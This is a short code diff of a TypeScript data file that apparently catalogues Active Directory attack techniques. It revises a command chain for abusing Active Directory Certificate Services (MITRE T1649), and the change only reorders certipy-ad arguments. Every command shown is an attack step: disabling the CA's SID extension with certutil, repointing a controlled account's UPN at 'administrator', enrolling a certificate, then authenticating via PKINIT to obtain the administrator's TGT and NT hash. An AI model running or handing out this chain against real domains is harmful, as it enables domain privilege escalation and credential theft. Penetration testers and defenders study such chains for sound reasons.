@@ -26,9 +26,9 @@ export const adBoxesNodes: TechniqueNodeDef[] = [
     commands: [
       { label: 'Set the CA state (needs ManageCA), then restart the CA', code: r`certutil -config "DC01.corp.local\CORP-CA" -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2
 net stop certsvc && net start certsvc`, lang: 'cmd' },
-      { label: "Point a controlled account's UPN at the target", code: r`certipy-ad account update -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn administrator`, lang: 'bash' },
+      { label: "Point a controlled account's UPN at the target", code: r`certipy-ad account -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn administrator update`, lang: 'bash' },
       { label: 'Enroll an ordinary client-auth cert as that account, then revert the UPN', code: r`certipy-ad req -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -ca CORP-CA -template User
-certipy-ad account update -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn svc_infra@corp.local`, lang: 'bash' },
+certipy-ad account -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn svc_infra@corp.local update`, lang: 'bash' },
       { label: 'Authenticate as the target via PKINIT → TGT + NT hash', code: r`certipy-ad auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
     ],
     mitre: mitre('T1649'),
